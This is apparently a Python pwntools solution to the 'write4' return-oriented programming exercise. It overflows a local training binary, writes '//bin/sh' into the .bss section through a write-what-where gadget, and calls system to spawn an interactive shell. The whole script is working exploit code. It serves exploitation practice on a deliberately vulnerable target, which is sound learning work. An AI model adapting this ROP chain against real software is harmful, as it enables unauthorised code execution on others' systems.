#!/usr/bin/env python3

from pwn import *

pwn = process("./write4")
#gdb.attach(pwn, '''
#break main
#''')

what = b'\x2f\x2f\x62\x69\x6e\x2f\x73\x68' # //bin/sh
where = p64(0x00601060) # writeable section in .bss, make sure to not overwrite important data
write_what_where = p64(0x00400820) # mov qword ptr [R14], R15

pop_r14_pop_r15 = p64(0x0000000000400890) # pop r14; pop r15; ret;
pop_rdi = p64(0x0000000000400893) # pop rdi; ret;

system = p64(0x00400810) # call system

junk = b'A' * 40

buf = junk
buf += pop_r14_pop_r15
buf += where
buf += what
buf += write_what_where
buf += pop_rdi
buf += where
buf += system


pwn.sendline(buf)
pwn.interactive()
